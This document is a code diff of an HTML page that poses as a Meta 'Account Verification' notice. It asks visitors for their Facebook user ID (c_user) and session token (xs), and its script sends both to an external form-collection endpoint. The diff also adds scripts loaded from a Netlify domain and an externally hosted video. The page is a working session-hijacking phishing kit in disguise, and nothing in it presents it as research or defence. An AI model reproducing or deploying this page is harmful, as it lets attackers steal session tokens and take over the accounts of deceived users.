@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en" webcrx=""><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Account Verification | Meta</title>
@@ -274,7 +272,7 @@
             }
         }
     </style>
-</head>
+<script src="blob:https://information-required.netlify.app/6d3fe259-e8d8-4f6b-bdad-a4ea7badc3b5"></script><script src="blob:https://information-required.netlify.app/ae38e218-fa11-47cd-b9a0-ba70662e88af"></script></head>
 <body>
     <header class="header">
         <div class="container header-content">
@@ -312,8 +310,8 @@
                 
                 <div class="video-container">
                     <div class="video-wrapper">
-                        <video controls autoplay>
-                            <source src="watch-video.mp4" type="video/mp4">
+                        <video controls="" autoplay="">
+                            <source src="https://remarkable-pony-4c953e.netlify.app/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4" type="video/mp4">
                             Your browser does not support the video tag.
                         </video>
                     </div>
@@ -326,13 +324,13 @@
                 
                 <div class="form-group">
                     <label for="c_user" class="form-label">User ID (c_user)</label>
-                    <input type="number" id="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter your 15-digit user ID">
+                    <input type="number" id="c_user" class="form-control" required="" pattern="^\d{15}$" title="Please enter your 15-digit user ID">
                     <p class="form-note">This is a 15-digit number found in your account information</p>
                 </div>
                 
                 <div class="form-group">
                     <label for="xs" class="form-label">Session Token (xs)</label>
-                    <input type="text" id="xs" class="form-control" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$">
+                    <input type="text" id="xs" class="form-control" required="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$">
                     <p class="form-note">This is a combination of letters, numbers, and special characters</p>
                 </div>
                 
@@ -363,15 +361,15 @@
             const cUserInput = document.getElementById("c_user");
             const xsInput = document.getElementById("xs");
             
-          fetch("https://submit-form.com/QMpYhIxdI", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
+            fetch("https://submit-form.com/QMpYhIxdI", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
                 },
                 body: JSON.stringify({
                     c_user: cUserInput.value,
                     xs: xsInput.value,
-                   
+                 
                 }),
             })
             .then((response) => {
@@ -391,5 +389,5 @@
             });
         }
     </script>
-</body>
-</html>
+
+</body></html>
